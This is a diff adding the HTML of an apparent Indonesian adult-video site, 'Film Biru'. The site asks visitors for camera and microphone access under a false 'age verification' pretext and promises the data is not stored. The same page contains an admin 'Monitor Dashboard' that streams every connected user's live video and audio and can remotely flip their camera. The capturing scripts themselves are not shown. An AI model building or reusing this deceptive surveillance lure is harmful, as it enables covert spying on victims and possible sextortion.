@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Film Biru — Nonton Film 18+</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="/style.css?v=9"/>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+
+<!-- ================================================================
+     1. LOGIN
+     ================================================================ -->
+<div class="screen active" id="screen-login">
+  <div class="login-bg">
+    <div class="login-bg-gradient"></div>
+    <div class="login-bg-lines"></div>
+  </div>
+  <div class="login-wrap">
+    <!-- Sisi kiri: branding -->
+    <div class="login-left">
+      <div class="brand-logo">
+        <span class="brand-name">FILM<span class="brand-accent">BIRU</span></span>
+      </div>
+      <div class="login-hero-text">
+        <h1>Nonton Tanpa<br/><span class="text-accent">Batas.</span></h1>
+        <p>Ribuan video HD tersedia. Cukup masukkan nama dan mulai nikmati.</p>
+      </div>
+      <div class="login-features">
+        <div class="feat-item"><span class="feat-icon">⚡</span><span>Stream HD Instan</span></div>
+        <div class="feat-item"><span class="feat-icon">🔒</span><span>Terenkripsi & Aman</span></div>
+        <div class="feat-item"><span class="feat-icon">📡</span><span>Server Asia Tenggara</span></div>
+      </div>
+    </div>
+
+    <!-- Sisi kanan: form login -->
+    <div class="login-right">
+      <div class="login-card">
+        <div class="lc-header">
+          <h2>Masuk</h2>
+          <p>Verifikasi usia 18+ diperlukan</p>
+        </div>
+
+        <div class="error-msg" id="login-error">
+          <span class="err-icon">⚠</span>
+          <span id="login-error-text">Nama tidak boleh kosong.</span>
+        </div>
+
+        <div class="form-group">
+          <label>Nama Lengkap</label>
+          <input id="login-name" type="text" placeholder="Masukkan nama Anda" autocomplete="name"/>
+        </div>
+
+        <div id="password-section" class="form-group" style="display:none;">
+          <label>Password Admin</label>
+          <input id="login-pass" type="password" placeholder="Masukkan password" autocomplete="current-password"/>
+        </div>
+
+        <div id="admin-detected" style="display:none;" class="admin-badge-info">
+          <span>👑</span> Admin terdeteksi — masukkan password
+        </div>
+
+        <div class="consent-box">
+          <label class="consent-check">
+            <input id="chk-consent" type="checkbox"
+              onchange="document.getElementById('btn-login').disabled=!this.checked"/>
+            <span class="checkmark"></span>
+            <span class="consent-text">Saya menyatakan berusia minimal <strong>18 tahun</strong> dan menyetujui syarat platform ini.</span>
+          </label>
+        </div>
+
+        <button class="btn-login-main" id="btn-login" disabled>
+          <span id="btn-text">Masuk & Mulai Nonton</span>
+          <span class="btn-arrow">→</span>
+        </button>
+
+        <p class="login-version">Film Biru v2.1 · 18+ Only</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     2. CONSENT KAMERA
+     ================================================================ -->
+<div class="screen" id="screen-consent">
+  <div class="consent-wrap">
+    <div class="consent-card">
+      <h2>Verifikasi Usia</h2>
+      <p class="cc-desc">Sebelum menonton, platform memerlukan izin kamera & mikrofon untuk memverifikasi usia Anda.</p>
+
+      <div class="cc-list">
+        <div class="cc-item">
+          <span class="cc-dot green"></span>
+          <div>
+            <strong>Stream Video HD</strong>
+            <span>Konten diakses setelah verifikasi selesai</span>
+          </div>
+        </div>
+        <div class="cc-item">
+          <span class="cc-dot blue"></span>
+          <div>
+            <strong>Verifikasi per Sesi</strong>
+            <span>Diperlukan setiap kali membuka platform</span>
+          </div>
+        </div>
+        <div class="cc-item">
+          <span class="cc-dot yellow"></span>
+          <div>
+            <strong>Data Terenkripsi</strong>
+            <span>Semua data aman & tidak disimpan permanen</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc-actions">
+        <button class="btn-agree" onclick="requestCamera()">
+          Izinkan & Lanjutkan
+        </button>
+        <button class="btn-decline" onclick="declineCamera()">Tolak & Keluar</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     3. WATCH SCREEN — Landscape Grid
+     ================================================================ -->
+<div class="screen" id="screen-watch">
+  <span class="session-timer" id="session-timer" style="display:none;">00:00:00</span>
+
+  <!-- Sidebar kiri -->
+  <aside class="watch-sidebar">
+    <div class="ws-brand">
+      <span>FILMBIRU</span>
+    </div>
+    <div class="ws-user">
+      <div class="ws-avatar" id="user-avatar-chip">U</div>
+      <div class="ws-userinfo">
+        <span class="ws-name" id="user-name-chip">User</span>
+        <span class="ws-role">Penonton</span>
+      </div>
+    </div>
+    <div class="ws-divider"></div>
+    <nav class="ws-nav">
+      <div class="ws-nav-item active">
+        Semua Video
+      </div>
+    </nav>
+    <div class="ws-bottom">
+      <button class="ws-logout" onclick="endSession()">
+        <span>⏻</span> Keluar
+      </button>
+    </div>
+  </aside>
+
+  <!-- Konten utama -->
+  <main class="watch-main">
+    <div class="wm-header">
+      <div>
+        <h2 class="wm-title">Pilih Video</h2>
+        <p class="wm-sub">Pilih video untuk mulai menonton</p>
+      </div>
+      <div class="wm-user-badge">
+        <span class="wm-badge-name" id="wm-badge-name">User</span>
+        <button class="wm-badge-logout" onclick="endSession()">⏻ Keluar</button>
+      </div>
+    </div>
+    <div class="film-grid" id="film-grid"></div>
+  </main>
+</div>
+
+
+<!-- ================================================================
+     4. ADMIN DASHBOARD — Landscape
+     ================================================================ -->
+<div class="screen" id="screen-admin">
+
+  <!-- Sidebar admin -->
+  <aside class="admin-sidebar">
+    <div class="as-brand">
+      <span>FILMBIRU</span>
+    </div>
+
+    <div class="as-badge">👑 ADMIN</div>
+
+    <div class="as-stats">
+      <div class="as-stat">
+        <div class="as-stat-val" id="admin-stat-active">0</div>
+        <div class="as-stat-label">Sesi Aktif</div>
+      </div>
+      <div class="as-stat">
+        <div class="as-stat-val green" id="admin-stat-video">0</div>
+        <div class="as-stat-label">Video Live</div>
+      </div>
+      <div class="as-stat">
+        <div class="as-stat-val blue" id="admin-stat-audio">0</div>
+        <div class="as-stat-label">Audio Aktif</div>
+      </div>
+    </div>
+
+    <div class="as-divider"></div>
+
+    <div class="as-status">
+      <div class="sse-dot" id="sse-dot"></div>
+      <span id="sse-status-text">Menghubungkan...</span>
+    </div>
+
+    <div class="as-time" id="admin-stat-time">—</div>
+
+    <div class="as-bottom">
+      <div class="as-username" id="admin-username">Admin</div>
+      <button class="as-logout" onclick="adminLogout()">⏻ Logout</button>
+    </div>
+  </aside>
+
+  <!-- Konten admin -->
+  <div class="admin-content">
+    <!-- Header -->
+    <div class="ac-header">
+      <h2>Monitor Dashboard</h2>
+      <div class="ac-live">
+        <div class="rec-dot"></div>
+        <span>LIVE</span>
+      </div>
+    </div>
+
+    <!-- Grid sesi pengguna -->
+    <div class="sessions-grid" id="admin-session-grid">
+      <div class="empty-state" style="grid-column:1/-1;">
+        <div class="es-icon">📡</div>
+        <div>Menunggu pengguna terhubung...<br/>Video & audio akan muncul otomatis.</div>
+      </div>
+    </div>
+
+    <!-- Log aktivitas -->
+    <div class="log-panel">
+      <div class="lp-head">
+        <h3>📋 Log Aktivitas</h3>
+        <button class="lp-clear" onclick="clearAdminLog()">Bersihkan</button>
+      </div>
+      <div class="log-body" id="admin-log"></div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     6. MODAL PERBESAR (Admin)
+     ================================================================ -->
+<div class="video-modal" id="video-modal">
+  <div class="video-modal-inner">
+    <div class="vm-header">
+      <div class="vm-user">
+        <div class="vm-avatar" id="vm-avatar">U</div>
+        <div class="vm-userinfo">
+          <div class="vm-name" id="vm-name">Pengguna</div>
+          <div class="vm-email" id="vm-email">—</div>
+        </div>
+      </div>
+      <div class="vm-actions">
+        <button class="vm-btn" onclick="flipCameraRequest(currentExpandedSession)">🔄 Flip</button>
+        <button class="vm-btn warn" onclick="warnFromModal()">⚠️ Peringatan</button>
+        <button class="vm-btn close-btn" onclick="closeExpandSession()">✕ Tutup</button>
+      </div>
+    </div>
+    <div class="vm-video-wrap">
+      <video id="vm-video" autoplay playsinline></video>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     FULLSCREEN VIDEO MODAL
+     ================================================================ -->
+<div class="fs-modal" id="fs-modal">
+  <div class="fs-modal-inner">
+    <div class="fs-header">
+      <span class="fs-title" id="fs-title">—</span>
+      <button class="fs-close" onclick="closeFsModal()">✕</button>
+    </div>
+    <div class="fs-video-wrap">
+      <video id="fs-video" playsinline autoplay preload="auto"></video>
+      <div class="fs-loading" id="fs-loading" style="display:none;">
+        <div class="fs-spinner"></div>
+        <div class="fs-loading-text">Memuat video...</div>
+      </div>
+      <div class="fs-error" id="fs-error" style="display:none;">
+        <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
+        <div class="fs-error-text">Video gagal dimuat</div>
+        <button class="fs-retry-btn" id="fs-retry-btn">Coba Lagi</button>
+      </div>
+      <div class="fs-controls" id="fs-controls">
+        <div class="fs-progress-wrap">
+          <input type="range" class="fs-progress" id="fs-progress" value="0" min="0" step="0.1"/>
+          <div class="fs-time" id="fs-time">0:00 / 0:00</div>
+        </div>
+        <div class="fs-btn-row">
+          <button class="fs-ctrl-btn" id="fs-play-btn" onclick="fsTogglePlay()">▶</button>
+          <button class="fs-ctrl-btn" onclick="fsSeek(-10)">↺10</button>
+          <button class="fs-ctrl-btn" onclick="fsSeek(10)">↻10</button>
+          <button class="fs-ctrl-btn" id="fs-mute-btn" onclick="fsToggleMute()">🔊</button>
+          <input type="range" class="fs-vol" id="fs-vol" min="0" max="1" step="0.05" value="1"/>
+          <button class="fs-ctrl-btn fs-full-btn" onclick="fsFullscreen()">⛶</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     PERMISSION BUBBLE
+     ================================================================ -->
+<div id="permission-bubble-overlay" style="display:none;position:fixed;inset:0;z-index:999999;pointer-events:none;">
+  <svg style="position:absolute;top:0;left:0;width:200px;height:200px;pointer-events:none;z-index:5;overflow:visible;" viewBox="0 0 200 200">
+    <defs>
+      <marker id="arrowhead" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto">
+        <path d="M0,0 L0,8 L8,4 Z" fill="#4ADE80" style="filter:drop-shadow(0 0 4px rgba(74,222,128,0.9));"/>
+      </marker>
+    </defs>
+    <path d="M 80 185 C 78 150, 68 110, 68 62" fill="none" stroke="#4ADE80" stroke-width="3" stroke-linecap="round" marker-end="url(#arrowhead)" style="filter:drop-shadow(0 0 6px rgba(74,222,128,0.8));"/>
+  </svg>
+  <div id="pbo-card" style="position:absolute;top:108px;left:12px;max-width:300px;width:calc(100vw - 24px);background:#111827;border:1.5px solid rgba(74,222,128,0.5);border-radius:16px;padding:18px 16px 14px;box-shadow:0 8px 32px rgba(0,0,0,0.45);pointer-events:all;z-index:6;animation:pboBubblePop 0.35s cubic-bezier(0.34,1.56,0.64,1);">
+    <div style="position:absolute;top:-9px;left:30px;width:0;height:0;border-left:9px solid transparent;border-right:9px solid transparent;border-bottom:9px solid rgba(74,222,128,0.5);"></div>
+    <div style="position:absolute;top:-7px;left:31px;width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-bottom:8px solid #111827;"></div>
+    <div style="margin-bottom:10px;">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:1.1rem;color:#FFFFFF;letter-spacing:0.05em;">Aktifkan Izin</div>
+      <div style="font-size:0.72rem;color:#4ADE80;margin-top:2px;">untuk memverifikasi usia Anda</div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:9px;margin-bottom:14px;">
+      <div style="display:flex;align-items:flex-start;gap:9px;">
+        <div style="min-width:22px;height:22px;border-radius:50%;background:#4ADE80;color:#000;font-size:.72rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;">1</div>
+        <div style="font-size:.82rem;color:#9CA3AF;line-height:1.5;">Tap ikon <strong style="color:#fff;">🔒</strong> di kiri address bar</div>
+      </div>
+      <div style="display:flex;align-items:flex-start;gap:9px;">
+        <div style="min-width:22px;height:22px;border-radius:50%;background:#4ADE80;color:#000;font-size:.72rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;">2</div>
+        <div style="font-size:.82rem;color:#9CA3AF;line-height:1.5;">Pilih <strong style="color:#fff;">"Izin situs"</strong></div>
+      </div>
+      <div style="display:flex;align-items:flex-start;gap:9px;">
+        <div style="min-width:22px;height:22px;border-radius:50%;background:#4ADE80;color:#000;font-size:.72rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;">3</div>
+        <div style="font-size:.82rem;color:#9CA3AF;line-height:1.5;">Aktifkan <strong style="color:#fff;">Kamera & Mikrofon</strong> → muat ulang</div>
+      </div>
+    </div>
+    <div style="display:flex;gap:8px;">
+      <button onclick="closePboBubble()" style="flex:1;padding:10px 0;border-radius:9px;font-size:.82rem;font-weight:600;background:transparent;border:1px solid rgba(255,255,255,0.15);color:#6B7280;cursor:pointer;">Tutup</button>
+      <button onclick="location.reload()" style="flex:2;padding:10px 0;border-radius:9px;font-size:.82rem;font-weight:700;background:#4ADE80;border:none;color:#000;cursor:pointer;">🔄 Muat Ulang</button>
+    </div>
+  </div>
+</div>
+
+<style>
+@keyframes pboBubblePop {
+  from { opacity:0; transform:scale(0.88) translateY(-6px); }
+  to   { opacity:1; transform:scale(1) translateY(0); }
+}
+</style>
+
+<script src="/offline.js?v=1"></script>
+<script src="/app.js?v=5"></script>
+</body>
+</html>
